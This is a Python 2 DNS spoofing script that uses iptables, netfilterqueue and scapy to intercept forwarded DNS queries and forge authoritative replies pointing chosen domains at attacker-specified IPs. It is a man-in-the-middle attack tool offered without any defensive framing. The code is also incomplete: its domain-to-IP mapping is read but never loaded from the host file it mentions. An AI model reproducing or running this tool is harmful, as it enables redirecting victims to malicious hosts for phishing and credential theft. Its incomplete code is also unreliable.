#! /usr/bin/env python2.7
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os,sys

def usage():
    print "[*]Usage: python dnsspoof_with_queue.py [host file] [DNS_SERVER_IP]"

def modify(packet):
    print "Got packet"
    pkt = IP(packet.get_payload()) #converts the raw packet to a scapy compatible string

    #modify the packet all you want here
    if not pkt.haslayer(DNSQR):
        packet.accept()
    else:
        queried = pkt[DNS].qd.qname
        for key in dict:
            if queried.find(key) != -1:
                spoofed_IP = dict[key]
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoofed_IP))
                packet.set_payload(str(spoofed_pkt))
                packet.accept()
                print '[+] Redirecting ' + pkt[IP].src + " to " + spoofed_IP +" for domain " + queried
                return
        #print "No entries in host file for domain " + queried
        print "Forwarded packets to dns"
        packet.accept()

os.system('iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1')

nfqueue = NetfilterQueue()
nfqueue.bind(1, modify) 
try:
    print "[*] waiting for data"
    nfqueue.run()
except KeyboardInterrupt:
    pass